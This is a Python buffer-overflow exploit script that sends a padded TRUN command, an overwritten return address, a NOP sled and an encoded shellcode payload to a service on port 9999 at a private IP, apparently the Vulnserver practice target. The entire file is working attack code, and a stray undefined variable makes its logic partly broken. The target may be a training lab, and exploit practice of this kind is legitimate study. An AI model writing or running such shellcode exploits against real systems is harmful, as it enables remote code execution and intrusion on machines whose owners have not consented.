#!/usr/bin/env python3


import socket, time, sys
from time import sleep

ip = '192.168.74.142'
port = 9999
timeout = 5
payload = (
b"\xd9\xeb\xd9\x74\x24\xf4\xbd\x7a\x2f\xa6\x5e\x5f\x29\xc9\xb1"
b"\x52\x31\x6f\x17\x03\x6f\x17\x83\xbd\x2b\x44\xab\xbd\xdc\x0a"
b"\x54\x3d\x1d\x6b\xdc\xd8\x2c\xab\xba\xa9\x1f\x1b\xc8\xff\x93"
b"\xd0\x9c\xeb\x20\x94\x08\x1c\x80\x13\x6f\x13\x11\x0f\x53\x32"
b"\x91\x52\x80\x94\xa8\x9c\xd5\xd5\xed\xc1\x14\x87\xa6\x8e\x8b"
b"\x37\xc2\xdb\x17\xbc\x98\xca\x1f\x21\x68\xec\x0e\xf4\xe2\xb7"
b"\x90\xf7\x27\xcc\x98\xef\x24\xe9\x53\x84\x9f\x85\x65\x4c\xee"
b"\x66\xc9\xb1\xde\x94\x13\xf6\xd9\x46\x66\x0e\x1a\xfa\x71\xd5"
b"\x60\x20\xf7\xcd\xc3\xa3\xaf\x29\xf5\x60\x29\xba\xf9\xcd\x3d"
b"\xe4\x1d\xd3\x92\x9f\x1a\x58\x15\x4f\xab\x1a\x32\x4b\xf7\xf9"
b"\x5b\xca\x5d\xaf\x64\x0c\x3e\x10\xc1\x47\xd3\x45\x78\x0a\xbc"
b"\xaa\xb1\xb4\x3c\xa5\xc2\xc7\x0e\x6a\x79\x4f\x23\xe3\xa7\x88"
b"\x44\xde\x10\x06\xbb\xe1\x60\x0f\x78\xb5\x30\x27\xa9\xb6\xda"
b"\xb7\x56\x63\x4c\xe7\xf8\xdc\x2d\x57\xb9\x8c\xc5\xbd\x36\xf2"
b"\xf6\xbe\x9c\x9b\x9d\x45\x77\x64\xc9\x0f\x04\x0c\x08\x8f\x15"
b"\x5c\x85\x69\x43\x4e\xc0\x22\xfc\xf7\x49\xb8\x9d\xf8\x47\xc5"
b"\x9e\x73\x64\x3a\x50\x74\x01\x28\x05\x74\x5c\x12\x80\x8b\x4a"
b"\x3a\x4e\x19\x11\xba\x19\x02\x8e\xed\x4e\xf4\xc7\x7b\x63\xaf"
b"\x71\x99\x7e\x29\xb9\x19\xa5\x8a\x44\xa0\x28\xb6\x62\xb2\xf4"
b"\x37\x2f\xe6\xa8\x61\xf9\x50\x0f\xd8\x4b\x0a\xd9\xb7\x05\xda"
b"\x9c\xfb\x95\x9c\xa0\xd1\x63\x40\x10\x8c\x35\x7f\x9d\x58\xb2"
b"\xf8\xc3\xf8\x3d\xd3\x47\x18\xdc\xf1\xbd\xb1\x79\x90\x7f\xdc"
b"\x79\x4f\x43\xd9\xf9\x65\x3c\x1e\xe1\x0c\x39\x5a\xa5\xfd\x33"
b"\xf3\x40\x01\xe7\xf4\x40")
padding = b"\x90" * 32
shellcode = b"A"*2003 + b"\xaf\x11\x50\x62" + padding + payload
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    connect = s.connect((ip, port))
    s.recv(1024)
    print("[+] Sending BufferOverflow Exploit ...")
    s.send((b'TRUN /.:/' + shellcode + b'\r\n'))
    r = s.recv(0)
    s.close()
    buffer = buffer + b"A" * 100
except:
    sleep(5)
    print("[+] BufferOverflow Exploit sent!")
    sys.exit(0)
time.sleep(1)